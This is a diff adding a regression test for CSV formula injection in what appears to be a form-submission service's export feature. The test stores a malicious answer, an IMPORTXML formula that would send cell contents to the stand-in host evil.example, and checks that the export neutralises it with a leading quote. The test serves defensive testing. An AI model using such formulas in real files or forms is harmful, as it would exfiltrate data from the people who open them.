@@ -266,3 +266,40 @@ describe("files", () => {
     expect((await fetchApi(`/v1/files/file_xpother`, { headers: { "x-api-key": key } })).status).toBe(404);
   });
 });
+
+describe("formula injection", () => {
+  /**
+   * A cell a spreadsheet would run.
+   *
+   * `deFang` existed and was applied to the dashboard's download only, so the
+   * same answer typed by the same respondent came out neutralised through one
+   * export path and live through this one. An answer beginning `=` is a
+   * formula in the recipient's spreadsheet, and the recipient is the form's
+   * owner opening a file they trust.
+   */
+  it("neutralises a cell a spreadsheet would execute", async () => {
+    const now = Date.now();
+    await env.DB.batch([
+      env.DB.prepare(
+        `INSERT INTO submissions (id, form_id, form_version_id, organization_id, status, source, is_test,
+                                  search_text, started_at, updated_at, meta)
+         VALUES ('sbm_xpfrm1', ?, ?, ?, 'completed', 'api', 0, 'formula', ?, ?, ?)`,
+      ).bind(t.formId, VERSION_ID, t.orgId, now + 90, now + 90, JSON.stringify({ endingRef: "end_thanks" })),
+      env.DB.prepare(
+        `INSERT INTO submission_answers (id, submission_id, form_id, block_ref, block_type, value_json, updated_at)
+         VALUES ('ans_xpfrm1', 'sbm_xpfrm1', ?, 'q_email', 'email', ?, ?)`,
+      ).bind(t.formId, JSON.stringify('=IMPORTXML(CONCAT("//evil.example/?",A1),"//a")'), now),
+    ]);
+
+    const created = (await (await post(`/v1/forms/${t.formId}/exports`, { format: "csv" })).json()) as { id: string };
+    await runExport(env as never, created.id);
+    const view = (await (
+      await fetchApi(`/v1/exports/${created.id}`, { headers: { "x-api-key": key } })
+    ).json()) as { download_url: string };
+    const url = new URL(view.download_url);
+    const csv = await (await fetchApi(url.pathname + url.search)).text();
+
+    expect(csv).toContain("\"'=IMPORTXML(");
+    expect(csv).not.toContain("\"=IMPORTXML(");
+  });
+});
